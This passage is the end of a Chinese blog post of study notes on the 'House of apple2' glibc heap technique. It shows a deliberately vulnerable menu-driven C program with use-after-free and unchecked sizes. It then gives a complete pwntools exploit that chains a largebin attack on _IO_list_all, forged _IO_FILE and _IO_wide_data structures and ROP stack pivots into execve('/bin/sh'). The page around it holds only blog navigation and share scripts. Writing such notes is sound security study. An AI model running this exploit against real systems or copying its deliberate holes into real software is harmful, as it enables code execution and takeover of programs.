setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1.add"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"2.delete"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"3.edit"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"4.show"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"5.exit"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Your choice:"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index,<span class="built_in">size</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"index:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;index);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Size:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;<span class="built_in">size</span>);</span><br><span class="line">    chunk_list[index] = <span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    chunk_size[index] = <span class="built_in">size</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"index:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;index);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"size:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;<span class="built_in">size</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"context: "</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>,chunk_list[index],<span class="built_in">size</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"index:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;index);</span><br><span class="line">    <span class="built_in">free</span>(chunk_list[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"index:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;index);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"context: "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(chunk_list[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> choice;</span><br><span class="line">    init();</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;choice);</span><br><span class="line">        <span class="keyword">if</span>(choice==<span class="number">5</span>)&#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">1</span>)&#123;</span><br><span class="line">            add();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">delete</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">3</span>)&#123;</span><br><span class="line">            edit();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">4</span>)&#123;</span><br><span class="line">            show();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   1,py</span></span><br><span class="line"><span class="string">@Time    :   2024/12/25 19:12:32</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./test'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.arch=e.arch</span><br><span class="line">libc=ELF(<span class="string">'/usr/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">ip_port=[<span class="string">''</span>,]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> gdb_cmd=<span class="string">''</span>: gdb.attach(p,gdb_cmd) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">loghex=<span class="keyword">lambda</span> name,strs=<span class="string">''</span>: log.info(str(name)+<span class="string">':'</span>+hex(strs))</span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(num))   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,size,text)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(num)) </span><br><span class="line">    p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'context:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(num)) </span><br><span class="line"></span><br><span class="line"><span class="comment">#########################################################</span></span><br><span class="line"><span class="comment"># 利用largebin attack向IO_list_all里面写入一个可控的堆地址</span></span><br><span class="line"><span class="comment">#########################################################</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x428</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x418</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x438</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'context:'</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">loghex(<span class="string">'addr'</span>,addr)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">tzname=addr+<span class="number">0x400</span>+<span class="number">0x50</span></span><br><span class="line">loghex(<span class="string">'tzname'</span>,tzname)</span><br><span class="line">x=finder(<span class="string">'tzname'</span>,tzname,num=<span class="number">31</span>)</span><br><span class="line">log.info(libc.sym[<span class="string">'tzname'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#log.info('heap_addr:'+hex(heap_addr))</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">'a'</span>*<span class="number">0xf</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'aaa'</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">addr2=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">loghex(<span class="string">'addr2'</span>,addr2)</span><br><span class="line">heap_addr=addr2<span class="number">-0x290</span></span><br><span class="line">log.info(<span class="string">'heap_addr:'</span>+hex(heap_addr))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x20</span>,p64(addr2)+p64(addr)+p64(addr2)+p64(x.dump(<span class="string">'_IO_list_all'</span>)<span class="number">-0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x438</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x418</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x20</span>,p64(addr)+p64(addr)+p64(addr2)*<span class="number">2</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x428</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#########################################################</span></span><br><span class="line"><span class="comment"># apple 2  </span></span><br><span class="line"><span class="comment">#########################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x0000000000035732 : pop rsp ; ret</span></span><br><span class="line"><span class="comment">#0x000000000005a120 : mov rsp, rdx ; ret</span></span><br><span class="line"><span class="comment">#0x000000000002a3e5 : pop rdi ; ret</span></span><br><span class="line"><span class="comment">#0x000000000002be51 : pop rsi ; ret</span></span><br><span class="line">mov_rsp_rdx_ret=<span class="number">0x000000000005a120</span>+x.libcbase</span><br><span class="line">pop_rsp_ret=<span class="number">0x0000000000035732</span>+x.libcbase</span><br><span class="line">pop_rdi_ret=<span class="number">0x000000000002a3e5</span>+x.libcbase</span><br><span class="line">pop_rsi_ret=<span class="number">0x000000000002be51</span>+x.libcbase</span><br><span class="line">_IO_wfile_jumps=x.dump(<span class="string">'_IO_wfile_jumps'</span>)</span><br><span class="line">log.info(<span class="string">'_IO_wfile_jumps:'</span>+hex(_IO_wfile_jumps))</span><br><span class="line">_lock=<span class="number">0xcd0</span>+addr2+<span class="number">0x10</span></span><br><span class="line">log.info(<span class="string">'_lock:'</span>+hex(_lock))</span><br><span class="line">a_addr=addr2+<span class="number">0x10</span>+<span class="number">1104</span></span><br><span class="line">code_addr=addr2+<span class="number">0xcd0</span>+<span class="number">0x10</span></span><br><span class="line"><span class="comment">#造一个_IO_FILE结构体，</span></span><br><span class="line">fake_IO_FILE=<span class="string">''</span></span><br><span class="line"><span class="comment">#fake_IO_FILE+=p64(0x800) #_flags</span></span><br><span class="line"><span class="comment">#fake_IO_FILE+=p64(0xa81) #_IO_read_ptr</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>) <span class="comment">#_IO_read_end </span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>) <span class="comment">#_IO_read_base = 0x0,</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>) <span class="comment">#_IO_write_base = 0x0,</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">1</span>) <span class="comment">#_IO_write_ptr = 0x0,</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>) <span class="comment">#_IO_write_end = 0x0,</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>) <span class="comment">#_IO_buf_base = 0x0,</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>) <span class="comment">#_IO_buf_end = 0xffff &lt;error: Cannot access memory at address 0xffff&gt;,</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>) <span class="comment">#_IO_save_base = 0x0,</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>) <span class="comment">#_IO_backup_base = 0x55e88c680bb0 "",</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>) <span class="comment">#_IO_save_end = 0x7fb0ed36ca6Sd &lt;setcontext+61&gt; "H\213\242\240",</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>) <span class="comment">#_markers = 0x0,</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>) <span class="comment">#_chain = 0x0,</span></span><br><span class="line">fake_IO_FILE+=p32(<span class="number">0</span>) <span class="comment">#_fileno = 0,</span></span><br><span class="line">fake_IO_FILE+=p32(<span class="number">8</span>) <span class="comment">#_flags2 = 0,</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>) <span class="comment">#_old_offset = 0,</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>) <span class="comment">#_cur_column = 0,_vtable_offset,_shortbuf = "",</span></span><br><span class="line"><span class="comment">#fake_IO_FILE+=p64(0) #_vtable_offset = 0 '\000',</span></span><br><span class="line"><span class="comment">#fake_IO_FILE+=p64(0) #_shortbuf = "",</span></span><br><span class="line"><span class="comment">#疑似可以伪造为heap上空闲区域</span></span><br><span class="line">fake_IO_FILE+=p64(_lock) <span class="comment">#_lock = 0x55e88c680200,</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>) <span class="comment">#_offset = 0,</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>) <span class="comment">#_codecvt = 0x0,</span></span><br><span class="line"><span class="comment">#_wide_data 指向我们伪造的IO_wide_data结构体地址</span></span><br><span class="line">fake_IO_FILE+=p64(a_addr) <span class="comment">#_wide_data = 0x55e88c680b30</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)<span class="comment">#_freeres_list = 0x0,a</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)<span class="comment">#_freeres_buf = 0x0,</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)<span class="comment">#__pad5 = 0,</span></span><br><span class="line">fake_IO_FILE+=p32(<span class="number">0</span>)<span class="comment">#_mode = 0,</span></span><br><span class="line">fake_IO_FILE+=p32(<span class="number">0</span>)+p64(<span class="number">0</span>)*<span class="number">2</span><span class="comment">#_unused2 = '\000' &lt;repeats 19 times&gt;</span></span><br><span class="line"><span class="comment">#指向_IO_wfile_jumps 虚表 可以从gblic中获取</span></span><br><span class="line">fake_IO_FILE+=p64(_IO_wfile_jumps) <span class="comment">#0X18</span></span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x400</span>,fake_IO_FILE)</span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造IO_wide_data结构体</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#rsp进行二次栈迁移</span></span><br><span class="line">A_IO_wide_data=p64(pop_rsp_ret)  <span class="comment">#*_IO_read_ptr</span></span><br><span class="line"><span class="comment">#返回到我们写入恶意代码地址</span></span><br><span class="line">A_IO_wide_data+=p64(code_addr+<span class="number">0x10</span>)    <span class="comment">#*_IO_read_end  </span></span><br><span class="line">A_IO_wide_data+=p64(<span class="number">0</span>)           <span class="comment">#*_IO_read_base</span></span><br><span class="line">A_IO_wide_data+=p64(<span class="number">0</span>)           <span class="comment">#*_IO_write_base;    /* Start of put area. */</span></span><br><span class="line">A_IO_wide_data+=p64(<span class="number">0</span>)           <span class="comment">#*_IO_write_ptr;    /* Current put pointer. */</span></span><br><span class="line">A_IO_wide_data+=p64(<span class="number">0</span>)           <span class="comment">#*_IO_write_end;    /* End of put area. */</span></span><br><span class="line">A_IO_wide_data+=p64(<span class="number">0</span>)           <span class="comment">#*_IO_buf_base;    /* Start of reserve area. */</span></span><br><span class="line">A_IO_wide_data+=p64(<span class="number">0</span>)           <span class="comment">#*_IO_buf_end; </span></span><br><span class="line">A_IO_wide_data+=p64(<span class="number">0</span>)           <span class="comment">#*_IO_save_base</span></span><br><span class="line">A_IO_wide_data+=p64(<span class="number">0</span>)           <span class="comment">#*_IO_backup_base;</span></span><br><span class="line">A_IO_wide_data+=p64(<span class="number">0</span>)           <span class="comment">#*_IO_save_end;</span></span><br><span class="line">log.info(hex(len(A_IO_wide_data)))</span><br><span class="line">A_IO_wide_data+=<span class="string">'\x00'</span>*(<span class="number">0Xa0</span><span class="number">-0x10</span><span class="number">-8</span>)+p64(code_addr<span class="number">-0x68</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x400</span>,A_IO_wide_data)</span><br><span class="line"><span class="comment">#调用mov_rsp_rdx_ret将rdx迁移到rsp。将rip劫持到A_IO_wide_data处进行第一次栈迁移</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x400</span>,p64(mov_rsp_rdx_ret)+<span class="string">'/bin/sh\x00'</span>+p64(pop_rdi_ret)+p64(code_addr+<span class="number">8</span>)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)+p64(x.dump(<span class="string">'execve'</span>)))</span><br><span class="line">debug()</span><br><span class="line"><span class="comment">#add(6,0x418)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2024/12/27/House%20of%20apple2%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">House of apple2 学习笔记</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">lexsd6</a></p>
+        <p><span>发布时间:</span>2024-12-27, 23:46:30</p>
+        <p><span>最后更新:</span>2024-12-27, 23:47:31</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2024/12/27/House%20of%20apple2%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="House of apple2 学习笔记">lexsd6.github.io/2024/12/27/House%20of%20apple2%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a>
+            <span class="copy-path" data-clipboard-text="原文: lexsd6.github.io/2024/12/27/House%20of%20apple2%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/　　作者: lexsd6" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2024/07/10/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/">
+                    第二章日志分析-mysql-应急响应-玄机靶场
+                </a>
+            </div>
+        
+    </nav>
+
+
+
+  
+
+  <!-- code.copy.start -->
+	 <!-- 
+<script src="/js/clipboard.js"></script>
+  -->
+	 <!-- 
+<script src="/js/jquery.min.js"></script>
+ -->
+	 <!-- 
+<script src="/js/clipboard_use.js"></script>
+ -->
+	<script type="text/javascript" src="/js/clipboard.js"></script>
+ 	<script type="text/javascript" src="/js/jquery.min.js"></script>
+	<script type="text/javascript" src="/js/clipboard_use.js"></script>
+
+    <!-- code.copy.end -->
+</article>
+
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#利用条件"><span class="toc-text">利用条件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用原理"><span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-IO-wfile-overflow-函数控制程序执行流"><span class="toc-text">利用_IO_wfile_overflow 函数控制程序执行流</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#例子思路"><span class="toc-text">例子思路</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-4 i,
+        .toc-level-4 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"House of apple2 学习笔记　| lexsd6's home　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+      <section class="livere" id="comments">
+    <!-- 来必力City版安装代码 -->
+    <div id="lv-container" data-id="city" data-uid="MTAyMC81NDYyMC8zMTA5MQ==">
+    <script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+	
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+	
+       })(document, 'script');
+	
+    </script>
+    <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+
+	</div>
+
+    <!-- City版安装代码已完成 -->
+<script type="text/javascript">
+    
+setInterval(function () {
+    var box = document.querySelector(".trc_rbox_container");
+    if(box) box.outerHTML = "";
+}, 2000);
+document.getElementById("taboola-livere").style='display:none';
+</script>
+</section>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2024/07/10/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/" title="下一篇: 第二章日志分析-mysql-应急响应-玄机靶场">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
